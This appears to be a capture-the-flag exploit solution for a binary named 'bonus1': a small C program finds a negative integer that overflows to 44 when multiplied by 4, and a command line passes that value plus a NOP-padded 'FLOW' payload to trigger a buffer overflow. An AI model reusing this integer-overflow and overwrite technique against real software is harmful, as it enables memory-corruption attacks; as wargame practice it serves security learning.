#include <stdio.h>

int main(int argc, char *argv[]){
        signed int neg = -1;
        while((neg * 4) != 44 ){
                neg--;
        }
        printf("%d\n",neg);
        //
	printf("%d\n",neg << 2);
}


./bonus1 -1073741813 $(python -c 'print "\x90" * 40 + "\x46\x4c\x4f\x57"')